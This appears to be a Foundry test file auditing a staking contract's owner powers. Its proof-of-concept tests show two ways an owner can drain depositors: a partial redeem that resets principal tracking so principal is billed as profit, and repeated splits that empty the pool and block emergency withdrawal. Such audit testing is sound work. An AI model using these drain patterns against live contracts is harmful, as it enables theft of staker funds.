// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { Test } from "forge-std/Test.sol";
import { ArbiSmartV2 } from "../src/ArbiSmartV2.sol";
import { TestUSDC, MockConditionalTokens } from "./ArbiSmartV2.t.sol";

/// @notice Adversarial tests answering one question: under what conditions
///         can the owner drain the pool? These are written from the owner's
///         side, deliberately trying to extract staker principal.
contract OwnerPowersTest is Test {
    ArbiSmartV2 internal arbi;
    TestUSDC internal usdc;
    MockConditionalTokens internal ctf;

    address internal constant CTF_ADDRESS = 0x4D97DCd97eC945f40cF65F87097ACe5EA0476045;

    address internal owner = makeAddr("owner");
    address internal ownerWallet = makeAddr("ownerWallet");
    address internal feeWallet1 = makeAddr("feeWallet1");
    address internal feeWallet2 = makeAddr("feeWallet2");
    address internal profitRecipient = makeAddr("profitRecipient");
    address internal alice = makeAddr("alice");

    uint256 internal constant STAKE = 1000_000000;

    function setUp() public {
        usdc = new TestUSDC();
        arbi = new ArbiSmartV2(address(usdc), owner, feeWallet1, feeWallet2, profitRecipient);

        MockConditionalTokens impl = new MockConditionalTokens();
        vm.etch(CTF_ADDRESS, address(impl).code);
        ctf = MockConditionalTokens(CTF_ADDRESS);

        vm.warp(block.timestamp + 25 hours);

        usdc.mint(alice, 100_000_000000);
        vm.prank(alice, alice);
        usdc.approve(address(arbi), type(uint256).max);

        vm.prank(alice, alice);
        arbi.stake(STAKE, address(0));
    }

    function _partition() internal pure returns (uint256[] memory p) {
        p = new uint256[](2);
        p[0] = 1;
        p[1] = 2;
    }

    /// @notice VECTOR 1 — partial redemption resets the principal tracker.
    ///         executePolymarketRedeem zeroes committedByCondition before it
    ///         knows how much actually came back. A second redeem on the same
    ///         condition therefore sees committed == 0 and treats 100% of the
    ///         proceeds as "profit", handing profitFeeBPS of pure staker
    ///         principal to profitRecipient.
    function test_VECTOR1_partialRedeemLetsOwnerBillPrincipalAsProfit() public {
        vm.startPrank(owner);
        arbi.setProfitRecipient(ownerWallet);
        arbi.setProfitFeeBPS(2000); // the 20% hard cap
        arbi.executePolymarketSplit(bytes32("mkt"), _partition(), 200_000000);
        vm.stopPrank();

        usdc.mint(CTF_ADDRESS, 200_000000);

        // First redeem returns only half the position. profit == 0, correct.
        ctf.setRedeemPayout(100_000000);
        vm.prank(owner);
        arbi.executePolymarketRedeem(bytes32("mkt"), _partition());

        assertEq(usdc.balanceOf(ownerWallet), 0, "first redeem is honest");
        assertEq(arbi.committedByCondition(bytes32("mkt")), 0, "but principal tracker is now zeroed");

        // Second redeem returns the other half. committed is 0, so the whole
        // amount is billed as profit.
        vm.prank(owner);
        arbi.executePolymarketRedeem(bytes32("mkt"), _partition());

        assertEq(usdc.balanceOf(ownerWallet), 20_000000, "20% of pure principal extracted to owner's wallet");
    }

    /// @notice VECTOR 2 — the 20% split cap is per-call, not cumulative, so
    ///         repeated calls converge on the entire balance. Collateral ends
    ///         up as contract-held outcome tokens rather than in a wallet, so
    ///         this is a liquidity freeze rather than theft — but stakers
    ///         cannot withdraw what is not there.
    function test_VECTOR2_repeatedSplitsDrainNearlyTheWholeBalance() public {
        uint256 startBalance = usdc.balanceOf(address(arbi));

        vm.startPrank(owner);
        for (uint256 i = 0; i < 40; i++) {
            uint256 available = arbi.polymarketArbitrageAvailable();
            if (available == 0) break;
            arbi.executePolymarketSplit(bytes32("mkt"), _partition(), available);
        }
        vm.stopPrank();

        uint256 left = usdc.balanceOf(address(arbi));
        assertLt(left, startBalance / 100, "over 99% of collateral moved out of the pool");

        // A staker can no longer be made whole.
        vm.prank(owner);
        arbi.pause();
        vm.warp(block.timestamp + 31 days);

        vm.prank(alice, alice);
        vm.expectRevert();
        arbi.emergencyWithdraw();
    }

    /// @notice CONTROL — no owner-callable function moves principal straight
    ///         to an arbitrary address. Both drain vectors above need the
    ///         Polymarket path; neither is a one-call withdrawal.
    function test_CONTROL_noDirectPrincipalWithdrawalExists() public {
        uint256 before = usdc.balanceOf(address(arbi));

        vm.startPrank(owner);
        arbi.setFeeWallets(ownerWallet, ownerWallet);
        arbi.setProfitRecipient(ownerWallet);
        arbi.setProfitFeeBPS(2000);
        vm.stopPrank();

        assertEq(usdc.balanceOf(address(arbi)), before, "reconfiguring every fee wallet moves nothing by itself");
        assertEq(usdc.balanceOf(ownerWallet), 0);
    }
}
